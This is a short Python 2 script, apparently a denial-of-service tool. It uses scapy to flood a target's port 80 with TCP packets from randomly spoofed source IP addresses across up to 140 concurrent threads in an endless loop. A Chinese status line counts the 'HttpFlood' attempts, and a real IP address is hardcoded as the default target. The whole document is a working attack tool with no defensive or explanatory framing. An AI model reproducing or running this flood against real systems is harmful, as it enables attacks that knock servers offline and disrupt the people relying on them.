

# -*- coding: cp936 -*-
from scapy.all import *
from threading import Thread,activeCount
from random import randint

 

class Loop(Thread):
    def __init__(self,remoteAddr):
        Thread.__init__(self)
        self.remoteAddr = remoteAddr

    def run(self):
        ip = str(randint(0,255))+'.'\
             +str(randint(0,255))+'.'\
             +str(randint(0,255))+'.'\
             +str(randint(0,255))
        sr1(IP(src = ip,dst = self.remoteAddr)/TCP(dport = 80),retry = 0,verbose = 0,timeout = 3)

       
class Main(Thread):
    def __init__(self,remoteAddr):
        Thread.__init__(self)
        self.remoteAddr = remoteAddr

    def run(self):
        limit = 140
        total = 0

        while True:
            if activeCount() < limit:
                Loop(remoteAddr = self.remoteAddr).start()
                total = total + 1
            print '目前已经进行的HttpFlood的次数为:',total

if __name__ == '__main__':
    remoteAddr = raw_input('IP=')
    if remoteAddr == '':
        remoteAddr = '202.103.25.12'

    Main(remoteAddr = remoteAddr).start()
	
----------------------------------------------------


